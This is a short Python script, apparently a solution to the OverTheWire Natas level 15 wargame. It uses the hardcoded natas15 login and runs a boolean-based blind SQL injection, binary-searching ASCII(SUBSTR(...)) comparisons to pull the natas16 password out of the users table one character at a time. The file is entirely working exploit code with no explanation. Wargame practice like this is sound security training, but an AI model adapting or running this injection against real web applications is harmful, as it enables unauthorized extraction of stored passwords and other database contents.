#! /usr/bin/python

import requests
import string

def compare(i, char_code):
	url = "http://natas15.natas.labs.overthewire.org/"
	auth_username = "natas15"
	auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

	injection = 'natas16"%20AND%20ASCII(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20username="natas16"),%20'+ str(i) +',%201))<"' + str(char_code)
	uri = ''.join([url,'?','username=', injection,'&debug'])
	r = requests.get(uri, auth=(auth_username,auth_password))
	
	return "This user exists." in r.text
	
def binarySearch(i, lower_bound, upper_bound):
	#print("Searching for character {} in [{} ({})..{} ({})] !".format(i, chr(lower_bound), lower_bound, chr(upper_bound), upper_bound))
	let = 0
		
	if upper_bound == lower_bound + 1:
		let = lower_bound
	else:
		middle = (lower_bound + upper_bound) // 2
		if compare(i, middle):
			let = binarySearch(i, lower_bound, middle)
		else:
			let = binarySearch(i, middle, upper_bound)
	return let

def init_search(i):
	lower_bound = ord('0')
	upper_bound = ord('z')
	return binarySearch(i, lower_bound, upper_bound)

def find_pass():
	pwd = ""
	for i in range(1, 33):
		let = chr(init_search(i))
		pwd += let
		print(pwd)

	print("Done.")

find_pass()
		 
